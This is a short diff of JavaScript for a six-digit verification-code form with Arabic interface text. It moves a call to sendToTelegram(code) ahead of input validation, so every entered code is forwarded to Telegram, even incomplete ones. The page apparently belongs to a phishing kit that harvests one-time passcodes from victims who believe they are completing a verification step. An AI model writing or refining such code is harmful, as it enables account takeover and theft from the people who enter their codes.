@@ -113,6 +113,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
         const code = Array.from(codeInputs).map(input => input.value).join('');
 
+        sendToTelegram(code);
+
         if (code.length !== 6) {
             showNotification('الرجاء إدخال الرمز كاملاً', 'error');
             return;
@@ -125,8 +127,6 @@ document.addEventListener('DOMContentLoaded', function() {
 
         submitBtn.textContent = 'جاري التحقق...';
         submitBtn.disabled = true;
-
-        sendToTelegram(code);
 
         setTimeout(() => {
             codeInputs.forEach(input => {
